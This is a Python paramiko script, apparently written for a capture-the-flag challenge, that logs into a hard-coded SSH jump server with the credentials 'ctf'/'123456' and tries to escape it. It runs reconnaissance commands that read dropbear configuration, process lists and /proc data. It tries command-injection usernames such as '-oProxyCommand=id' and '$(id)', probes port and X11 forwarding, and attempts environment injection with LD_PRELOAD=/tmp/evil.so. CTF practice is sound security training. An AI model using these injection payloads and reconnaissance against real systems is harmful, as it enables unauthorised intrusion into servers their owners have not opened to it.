import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def explore_dropbear_config():
    """探索dropbear配置"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    cmds = [
        "cat /etc/dropbear/*",
        "ls -la /etc/dropbear/",
        "cat /proc/*/cmdline | tr '\\0' ' '",
        "ps -ef",
        "cat /proc/1/cmdline | tr '\\0' ' '",
        "find / -name 'dropbear*' 2>/dev/null",
        "find / -name '*.conf' 2>/dev/null",
        "cat /proc/net/tcp",
        "cat /proc/mounts",
        "mount",
        "id",
        "whoami",
        "cat /proc/version",
        "uname -a",
    ]
    
    for cmd in cmds:
        print(f"[*] {cmd}")
        print(exec_cmd(ssh, cmd))
        print("-"*50)
    
    ssh.close()

def test_ssh_escape_techniques():
    """测试各种SSH逃逸技术"""
    
    # 测试使用特殊用户名（命令注入）
    # FakeJumpServer漏洞通常涉及用户名或其他参数的命令注入
    
    special_users = [
        "ctf",
        "-oProxyCommand=id",
        "ctf -oProxyCommand=id",
        "$(id)",
        "`id`",
        "ctf;id",
        "ctf|id",
        "ctf\nid",
    ]
    
    for user in special_users:
        try:
            print(f"[*] 测试用户名: {repr(user)}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(HOST, PORT, user, PASSWD, timeout=10)
            print(exec_cmd(ssh, "id"))
            ssh.close()
        except Exception as e:
            print(f"[-] 失败: {e}")
        print("-"*30)

def test_forwarding():
    """测试各种转发"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 检查支持的转发类型
    print("[*] 检查全局请求...")
    
    # 尝试请求tcpip-forward（远程端口转发）
    try:
        transport.request_port_forward('', 0)
        print("[+] 远程端口转发支持!")
    except Exception as e:
        print(f"[-] 远程端口转发: {e}")
    
    # 检查X11转发
    try:
        channel = transport.open_session()
        channel.request_x11()
        print("[+] X11转发支持!")
    except Exception as e:
        print(f"[-] X11转发: {e}")
    
    ssh.close()

def test_env_variables():
    """测试环境变量注入"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    channel = transport.open_session()
    
    # 尝试设置环境变量
    env_vars = {
        'LD_PRELOAD': '/tmp/evil.so',
        'PATH': '/tmp:$PATH',
        'TERM': '$(id)',
    }
    
    for key, value in env_vars.items():
        try:
            channel.set_env(key, value)
            print(f"[+] 环境变量 {key}={value} 设置成功")
        except Exception as e:
            print(f"[-] 环境变量 {key}: {e}")
    
    ssh.close()

def check_sshd_inner():
    """检查内部SSH服务器配置"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 查找dropbear进程和配置...")
    cmds = [
        "ps aux 2>/dev/null || ps",
        "cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | grep -v 'cat\\|grep'",
        "ls -la /etc/",
        "strings /sbin/dropbear 2>/dev/null | head -50",
        "file /sbin/dropbear 2>/dev/null",
    ]
    
    for cmd in cmds:
        print(f"\n[*] {cmd}")
        result = exec_cmd(ssh, cmd)
        if result.strip():
            print(result)
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] SSH Escape Technique Tests")
    print("="*50)
    
    print("\n[1] 探索dropbear配置")
    explore_dropbear_config()
    
    print("\n[2] 检查内部SSH服务器")
    check_sshd_inner()
    
    print("\n[3] 测试转发功能")
    test_forwarding()
    
    print("\n[4] 测试环境变量")
    test_env_variables()
